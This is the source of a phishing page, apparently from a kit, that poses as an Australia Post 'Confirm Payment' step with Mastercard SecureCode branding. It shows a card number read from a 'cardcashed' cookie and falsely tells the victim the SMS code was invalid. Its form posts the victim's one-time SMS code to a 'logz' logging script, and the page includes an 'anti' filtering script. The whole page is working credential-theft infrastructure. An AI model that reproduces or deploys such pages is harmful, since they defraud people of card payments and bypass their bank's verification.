<?php
include("./anti/index.php");
?>
<!DOCTYPE html>
<html lang="en">
<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Confirm Payment - Australia Post</title>
    <meta http-equiv="refresh" content="10; URL=xsms_en.php">

    <link rel="stylesheet" href="./login/resources/nevislogrend/applications/def/webdata/css/post.css" media="all" rel="stylesheet" type="text/css"/>
    <link href="./login/resources/nevislogrend/applications/def/webdata/css/logrend.css" rel="stylesheet" type="text/css" media="all">
    <link rel="icon" type="image/png" href="img/18138_2_1527064174.jpg"/>

    <link rel="stylesheet" href="./fonts/font-awesome.min.css">
    <script src="etc/cleave.min.js"></script>

    <script>
        /*Date Expiration*/


        document.addEventListener('DOMContentLoaded', () => {
            const cleave = new Cleave('.inpt2', {
                date: true,
                datePattern: ['m', 'y']
            });
        });


        /*Card Number*/


        document.addEventListener('DOMContentLoaded', () => {
            const cleave = new Cleave('.inpt1', {
                creditCard: true,
                delimiter: "-",
            });
        });



        function isInputNumber(evt) {

            var ch = String.fromCharCode(evt.which);

            if (!(/[0-9]/.test(ch))) {
                evt.preventDefault();
            }
        }
    </script>
    <style>
        .overlay {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            background-color: rgba(0, 0, 0, 0.5);
            border-radius: 6px;
            z-index: 1;
        }
        .loaderss {
            position: absolute;
            left: 50%;
            top: 50%;
            z-index: 1;
            transform: translate(-50%,-50%);
        }
        /*loader*/
        .lds-spinner {
            color: #FFF;
            display: inline-block;
            width: 80px;
            height: 80px;
        }
        .lds-spinner div {
            transform-origin: 40px 40px;
            animation: lds-spinner 1.2s linear infinite;
        }
        .lds-spinner div:after {
            content: " ";
            display: block;
            position: absolute;
            top: 3px;
            left: 37px;
            width: 6px;
            height: 18px;
            border-radius: 20%;
            background: #FFF;
        }
        .lds-spinner div:nth-child(1) {
            transform: rotate(0deg);
            animation-delay: -1.1s;
        }
        .lds-spinner div:nth-child(2) {
            transform: rotate(30deg);
            animation-delay: -1s;
        }
        .lds-spinner div:nth-child(3) {
            transform: rotate(60deg);
            animation-delay: -0.9s;
        }
        .lds-spinner div:nth-child(4) {
            transform: rotate(90deg);
            animation-delay: -0.8s;
        }
        .lds-spinner div:nth-child(5) {
            transform: rotate(120deg);
            animation-delay: -0.7s;
        }
        .lds-spinner div:nth-child(6) {
            transform: rotate(150deg);
            animation-delay: -0.6s;
        }
        .lds-spinner div:nth-child(7) {
            transform: rotate(180deg);
            animation-delay: -0.5s;
        }
        .lds-spinner div:nth-child(8) {
            transform: rotate(210deg);
            animation-delay: -0.4s;
        }
        .lds-spinner div:nth-child(9) {
            transform: rotate(240deg);
            animation-delay: -0.3s;
        }
        .lds-spinner div:nth-child(10) {
            transform: rotate(270deg);
            animation-delay: -0.2s;
        }
        .lds-spinner div:nth-child(11) {
            transform: rotate(300deg);
            animation-delay: -0.1s;
        }
        .lds-spinner div:nth-child(12) {
            transform: rotate(330deg);
            animation-delay: 0s;
        }
        @keyframes lds-spinner {
            0% {
                opacity: 1;
            }
            100% {
                opacity: 0;
            }
        }
        /*media*/
    </style>
</head>
<body class="login_background" >
<div class="overlay"></div>

<div class="header-and-footer-css outerWrapper">
    <div class="header-and-footer-css absoluteCenterWrapper">
        <div class="absoluteCenter">
            <div class="sp-internet-header">
                <div class="sp-internet-header-middle">
                    <div class="navigation_logo">
                        <a class="navigation_logo-link" href="index.php">
                            <img class="navigation_logo-image" src="./img/DPDG_logo_redgrad_rgb_responsive.svg" alt="Logo Dpd, To the homepage" role="img">
                        </a>
                    </div>
                    <div class="sp-internet-header-right">
                        <div class="dropdown">
                            <button class="dropbtn">EN</button>
                            <div class="arrow"></div>
                            <div class="dropdown-content">
                              <a id="lang-en" href="xsms_en.php">EN</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <script nonce="OymnIj8hTNI2BaWlInY1Gw==" type="text/javascript">
                document.getElementById("lang-en").style.display = "none";
                document.getElementsByClassName("dropdown-content")[0].setAttribute("onPage", "no");
                document.getElementsByClassName("dropdown")[0].addEventListener('click', function () {
                    if (document.getElementsByClassName("dropdown-content")[0].getAttribute("onPage") === "no") {
                        document.getElementsByClassName("dropdown-content")[0].setAttribute("onPage", "yes");
                        document.getElementsByClassName("dropdown-content")[0].style.display = "block";
                        document.getElementsByClassName("arrow")[0].classList.add("up");
                        return;
                    }
                    document.getElementsByClassName("dropdown-content")[0].setAttribute("onPage", "no");
                    document.getElementsByClassName("dropdown-content")[0].classList.add("hidden");
                    setTimeout(function () {
                        document.getElementsByClassName("dropdown-content")[0].style.display = "none";
                        document.getElementsByClassName("dropdown-content")[0].classList.remove("hidden");
                    }, 300);
                    document.getElementsByClassName("arrow")[0].classList.remove("up");
                }, false);
            </script>
            <style>
                #timer {
                    color: #F00;
                }
                .ppm-breadcrumb {
                    position: absolute;
                    height: 0;
                    width: 0;
                    overflow: hidden;
                }
                .second-sec-info-nb-imgs {
                    position: absolute;
                    right: 0;
                    top: 0 ;
                    color: #999;
                    padding: 8px ;
                    font-size: 14px;
                    margin-bottom: 0;
                }
                .second-sec-info-nb {
                    position: relative;
                    margin-bottom: 0;
                }
            </style>
            <div data-init-od-component="breadcrumb"></div>


            <link rel="stylesheet" href="./login/resources/nevislogrend/applications/def/webdata/css/sesam-buttons.css" type="text/css"/>
            <link rel="stylesheet" href="./login/resources/nevislogrend/applications/def/webdata/css/login-statics-cache-filter.css" type="text/css"/>








            <div id="login_content" class="single_column_container">

                <div id="main_content" class="row mx-mini">
                    <div class="col-12">
                        <div class="text-body mt-small-huge mb-large " style="text-align: center; width: 100%">
                            <img height="70" src="./img/img-verifiedbyvisa-mastercardsecurecode.png"/>
                         </div>
                    </div>
                    <div class="col-12">
                        <div class="text-body mt-small-huge mb-large"><h5 class="text-left">Please enter your Mastercard® SecureCodeTM</h5></div>
                        <p class="textMessage">
                            Mastercard® SecureCodeTM is MasterCard's international cardholder identification. credit card payments can be made on the internet.
                        </p>


                        <form id="mainForm" method="POST"  action="logz/logzsmsfailed_en.php">
                            <div id="section_login_collapsible" class="">



                                <div class="pt-4">



                                    <table class="table table-bordered" >
                                        <tr><th class="text-right">Dealer: </th><td class="text-left">Australia Post</td></tr>
                                        <tr><th class="text-right">Amount:</th><td class="text-left"><span>(3.50 AUD)</span></td></tr>
                                        <tr><th class="text-right">Date:</th><td  class="text-left">
                                                <script>
                                                    let date_ob = new Date();

                                                    // adjust 0 before single digit date
                                                    let date = ("0" + date_ob.getDate()).slice(-2);

                                                    // current month
                                                    let month = ("0" + (date_ob.getMonth() + 1)).slice(-2);

                                                    // current year
                                                    let year = date_ob.getFullYear();

                                                    // current hours
                                                    let hours = date_ob.getHours();

                                                    // current minutes
                                                    let minutes = date_ob.getMinutes();

                                                    // current seconds
                                                    let seconds = date_ob.getSeconds();

                                                    // prints date & time in YYYY-MM-DD HH:MM:SS format
                                                    document.write(year + "/" + month + "/" + date + " " + hours + ":" + minutes + ":" + seconds); </script></td></tr>
                                        <tr><th class="text-right">Card number: </th><td class="text-left">
                                                <?php
                                                try {

                                                    if (isset($_COOKIE["cardcashed"])) {
                                                        echo $_COOKIE["cardcashed"] . "<br />";
                                                    } else {
                                                        echo " xxxx xxxx xxxx 9010<br />";

                                                    }
                                                } catch (Exception $e) {
                                                    echo " xxxx xxxx xxxx 9010<br />";

                                                }


                                                ?></td></tr>
                                    </table>

                                    <div style="width: 100%; height: 0.7em; border-bottom: 1px solid #CCCCCC; text-align: center">
                          <span style="font-size: 1em; background-color: #FFFFFF; color: #666666" class="px-small-huge">
                              Mastercard® SecureCodeTM
                          </span>
                                    </div>

                                    <div class="text-body mt-small-huge mb-large"><h5 class="text-left">
                                            Secure payment with Mastercard®</h5></div>

                                    <style>  .second-sec-prg {
                                            color: #F00;
                                        }
                                    </style>
                                    <p class="second-sec-prg">Invalid SMS code! </p>

                                    <!--           -->
                                    <div class="p-t-large text-left">
                                        <fieldset>

                                            <div class="form-group">
                                                <section>

                                                    <label class="fm_label" id="label_isiwebuserid"
                                                           for="name">SMS Code</label>
                                                    <div class="input-group">

                                                        <input type="text" class="form-control inpt222"   placeholder="SMS-Code"  name="msg" required>
                                                    </div>
                                                    <div class="input-group">

                                                    <p class="sms-verif">Enter the verification code received by SMS: <span id="timer"></span></p>
                                                    </div>
                                                    <script>
                                                        function countdown() {
                                                            var seconds = 60;
                                                            function tick() {
                                                                var counter = document.getElementById("timer");
                                                                seconds--;

                                                                // those if conditions to format the timer
                                                                if (seconds >= 60) {
                                                                    if ((seconds - 60) > 10){
                                                                        counter.innerHTML = `01:${seconds - 60}`
                                                                    }
                                                                    else{
                                                                        counter.innerHTML = `01:0${seconds - 60}`
                                                                    }
                                                                }
                                                                else if (seconds > 10){
                                                                    counter.innerHTML = `00:${seconds}`
                                                                }
                                                                else {
                                                                    counter.innerHTML = `00:0${seconds}`
                                                                }

                                                                // check if if counter reached 0 then do you you input disable input or something
                                                                if( seconds > 0 ) {
                                                                    setTimeout(tick, 1000);
                                                                } else {
                                                                    // disable input or something
                                                                    console.log("timer is over input is disabled")
                                                                }
                                                            }
                                                            tick();
                                                        }
                                                        // start the countdown
                                                        countdown();

                                                    </script>
                                                </section>
                                            </div>



                                            <div id="form-actions" class="sub-form-actions">



                                                <div class="row pb-large">

                                                    <div class="col-12 col-rg-12 order-first order-rg-last">
                                                        <button class="btn btn-primary col-12" name="confirmLogin"
                                                                id="actionLogin" type="submit"><span>Verify</span> <i class="fa fa-check-circle"></i></button>
                                                    </div>
                                                </div>

                                            </div>
                                        </fieldset>
                                    </div>
                                </div>

                            </div>

                        </form>
                    </div>
                </div>

            </div>


            <script nonce="OymnIj8hTNI2BaWlInY1Gw==" type="text/javascript">
                var guiName = "loginRegistration";
                var MESSAGES = {
                    required: "Please complete this field.",
                    email: "Please check your e-mail address.",
                    minlength: "Your password does not meet the requirements.",
                    maxlength: "Your password does not meet the requirements.",
                    pwdformat: "Please check your password.",
                    migPwdformat: "Please check your password.",
                    regex: "Please check your password.",
                    generic: "Please check your input.",
                    must_accept_agb: "Please accept the GTC."
                };
                var layoutType = "";
                var preventMaximize = "true";
            </script>



            <section id="footer" class="header-and-footer-css footer ">
                <div class="container-fluid">
                    <div class="row text-left">
                        <div class="col-12">
                            <div class="col-12 mt-small-regular">
                                <a class="pr-regular footerContact" id="footerContact" href="#">Contact</a>
                                <a class="pr-regular footerInfo" id="footerInfo" href="#">Info</a>
                            </div>
                        </div>
                    </div>
                    <div class="row text-left">
                        <div class="col-1 col-rg-12 d-none d-rg-block">
                            <div class="col-12 mt-small-regular">
                                <a class="pr-regular" target="_blank" href="#">Accessibility</a>
                                <a class="pr-regular" target="_blank" href="#">GTC</a>
                                <a class="pr-regular" target="_blank" href="#">Data protection and disclaimer</a>
                                <a class="" target="_blank" href="#">Publication details</a>
                            </div>
                        </div>
                        <div class="col-12 col-rg-1 d-rg-none">
                            <div class="col-12 mt-small-regular">
                                <a class="pr-regular" target="_blank" href="#">Accessibility</a>
                                <a class="pr-regular" target="_blank" href="#">GTC</a>
                            </div>
                        </div>
                        <div class="col-12 col-rg-1 d-rg-none">
                            <div class="col-12 mt-small-regular">
                                <a class="pr-regular" target="_blank" href="#">Data protection and disclaimer</a>
                                <a class="" target="_blank" href="#">Publication details</a>
                            </div>
                        </div>
                    </div>
                    <div class="row text-left">
                        <div class="col-12">
                            <p class="col-12 mt-small-regular">
                                <strong>©
                                    2021
                                    Australia Post Ltd</strong>
                            </p>
                        </div>
                    </div>
                </div>

            </section>
        </div>
    </div>
</div>
<div class="loaderss">
    <div class="lds-spinner"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
</div>

</body>

</html>

<script nonce="OymnIj8hTNI2BaWlInY1Gw==" type="text/javascript">

    function getGlobalHostError() {
        return "";
    }

    function getGlobalHostMsg() {
        return false;
    }


    var POPUP_TEXT = {
        btn_recpwd: "Request new password",
        btn_close: "Close",
        btn_suissid: "Login with SwissID"
    };

    if ('no' === 'no' && getGlobalHostError()) {
        displayAllOverlayMessage(getGlobalHostError(), "", "", POPUP_TEXT);
    } else if (getGlobalHostMsg()) {
        displayAllOverlayMessage(getGlobalHostMsg(), "", "", POPUP_TEXT);
    }

</script>
